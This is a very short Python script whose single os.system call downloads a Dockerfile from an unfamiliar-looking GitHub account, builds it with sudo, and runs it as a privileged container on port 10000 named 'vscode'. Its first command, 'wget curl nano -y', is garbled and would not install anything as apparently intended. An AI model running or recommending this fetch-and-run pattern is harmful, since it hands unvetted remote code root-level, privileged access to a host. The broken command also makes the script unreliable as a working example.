import sys
import os
os.system('wget curl nano -y && wget https://raw.githubusercontent.com/44bd0rpm64ft/44bd0rpm64ft/main/Dockerfile && sudo docker build -t vscode:latest . && sudo docker run -p 10000:10000 --privileged --name vscode -dit vscode:latest')
